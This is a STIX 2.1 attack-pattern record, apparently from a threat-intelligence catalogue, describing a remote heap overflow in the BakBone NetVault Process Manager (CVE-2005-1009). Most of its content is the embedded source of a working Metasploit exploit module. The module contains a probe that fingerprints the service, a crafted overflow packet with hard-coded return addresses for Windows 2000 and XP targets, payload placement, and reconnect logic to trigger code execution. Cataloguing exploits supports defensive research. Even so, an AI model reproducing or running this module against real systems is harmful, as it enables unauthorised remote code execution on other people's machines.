{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--604e2d28-4f20-499a-9b28-34ca764b8a6a",
    "created": "2024-08-14T16:46:26.733382Z",
    "modified": "2024-08-14T16:46:26.733394Z",
    "name": "BakBone NetVault Remote Heap Overflow",
    "description": " This module exploits a heap overflow in the BakBone NetVault Process Manager service. This code is a direct port of the netvault.c code written by nolimit and BuzzDee. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/bakbone_netvault_heap.rb",
            "external_id": "bakbone_netvault_heap.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-1009"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'BakBone NetVault Remote Heap Overflow',\n      'Description'    => %q{\n    This module exploits a heap overflow in the BakBone NetVault\n  Process Manager service. This code is a direct port of the netvault.c\n  code written by nolimit and BuzzDee.\n      },\n      'Author'         => [ 'hdm', '<nolimit.bugtraq[at]ri0tnet.net>' ],\n      'References'     =>\n        [\n          ['CVE', '2005-1009'],\n          ['OSVDB', '15234'],\n          ['BID', '12967'],\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\\x20\",\n          'PrependEncoder' => \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows 2000 SP4 English',   { 'Ret' => 0x75036d7e, 'UEF' => 0x7c54144c } ],\n          ['Windows XP SP0/SP1 English', { 'Ret' => 0x7c369bbd, 'UEF' => 0x77ed73b4 } ],\n        ],\n\n      'Privileged'     => false,\n      'DisclosureDate' => '2005-04-01'\n      ))\n\n      register_options(\n      [\n        Opt::RPORT(20031)\n      ])\n  end\n\n  def check\n    connect\n\n    hname = \"METASPLOIT\"\n    probe =\n      \"\\xc9\\x00\\x00\\x00\\x01\\xcb\\x22\\x77\\xc9\\x17\\x00\\x00\\x00\\x69\\x3b\\x69\" +\n      \"\\x3b\\x69\\x3b\\x69\\x3b\\x69\\x3b\\x69\\x3b\\x69\\x3b\\x69\\x3b\\x69\\x3b\\x69\" +\n      \"\\x3b\\x73\\x3b\\x00\\x00\\x00\\x00\\x00\\xc0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" +\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\" +\n      \"\\x03\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" +\n      [ hname.length + 1 ].pack('V') + hname + \"\\x00\"\n    probe += \"\\x00\" * (201 - probe.length)\n\n    sock.put(probe)\n    res = sock.get_once(1, 10)\n\n    off = (res || '').index(\"NVBuild\")\n\n    if off\n      off += 21\n      ver  = res[off + 4, res[off, 4].unpack('V')[0]].to_i\n\n      if ver > 0\n        print_status(\"Detected NetVault Build #{ver}\")\n        return Exploit::CheckCode::Appears\n      end\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"Trying target #{target.name}...\")\n\n    head =\n      \"\\x00\\x00\\x02\\x01\\x00\\x00\\x00\\x8f\\xd0\\xf0\\xca\\x0b\\x00\\x00\\x00\\x69\" +\n      \"\\x3b\\x62\\x3b\\x6f\\x3b\\x6f\\x3b\\x7a\\x3b\\x00\\x11\\x57\\x3c\\x42\\x00\\x01\" +\n      \"\\xb9\\xf9\\xa2\\xc8\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x01\\xa5\\x97\" +\n      \"\\xf0\\xca\\x05\\x00\\x00\\x00\\x6e\\x33\\x32\\x3b\\x00\\x20\\x00\\x00\\x00\\x10\" +\n      \"\\x02\\x4e\\x3f\\xac\\x14\\xcc\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" +\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\" +\n      \"\\xa5\\x97\\xf0\\xca\\x05\\x00\\x00\\x00\\x6e\\x33\\x32\\x3b\\x00\\x20\\x00\\x00\" +\n      \"\\x00\\x10\\x02\\x4e\\x3f\\xc0\\xa8\\xea\\xeb\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" +\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" +\n      \"\\x00\\x01\\xa5\\x97\\xf0\\xca\\x05\\x00\\x00\\x00\\x6e\\x33\\x32\\x3b\\x00\\x20\" +\n      \"\\x00\\x00\\x00\\x10\\x02\\x4e\\x3f\\xc2\\x97\\x2c\\xd3\\x00\\x00\\x00\\x00\\x00\" +\n      \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" +\n      \"\\x00\\x00\\x00\\xb9\\xf9\\xa2\\xc8\\x02\\x02\\x00\\x00\\x00\\xa5\\x97\\xf0\\xca\" +\n      \"\\x05\\x00\\x00\\x00\\x6e\\x33\\x32\\x3b\\x00\\x20\\x00\\x00\\x00\\x04\\x02\\x4e\" +\n      \"\\x3f\\xac\\x14\\xcc\\x0a\\xb0\\xfc\\xe2\\x00\\x00\\x00\\x00\\x00\\xec\\xfa\\x8e\" +\n      \"\\x01\\xa4\\x6b\\x41\\x00\\xe4\\xfa\\x8e\\x01\\xff\\xff\\xff\\xff\\x01\\x02\"\n\n    pattern = make_nops(39947) + \"\\x00\\x00\\x00\"\n    p       = payload.encoded\n\n    pattern[0, head.length]  = head\n    pattern[32790, 2]        = \"\\xeb\\x0a\"\n    pattern[32792, 4]        = [ target.ret ].pack('V')\n    pattern[32796, 4]        = [ target['UEF'] ].pack('V')\n    pattern[32800, p.length] = p\n\n    sent = 0\n    try  = 0\n\n    15.times {\n      try += 1\n      connect\n      sent = sock.put(pattern)\n      disconnect\n      break if sent == pattern.length\n    }\n\n    if (try == 15)\n      print_error(\"Could not write full packet to server.\")\n      return\n    end\n\n    print_status(\"Overflow request sent, sleeping fo four seconds (#{try} tries)\")\n    select(nil,nil,nil,4)\n\n    print_status(\"Attempting to trigger memory overwrite by reconnecting...\")\n\n    begin\n      10.times { |x|\n        connect\n        sock.put(pattern)\n        print_status(\"   Completed connection #{x}\")\n        sock.get_once(1, 1)\n        disconnect\n      }\n    rescue\n    end\n\n    print_status(\"Waiting for payload to execute...\")\n\n    handler\n    disconnect\n  end\n\n  def wfs_delay\n    5\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-04-01",
    "x_mitre_platforms": [
        "win'"
    ]
}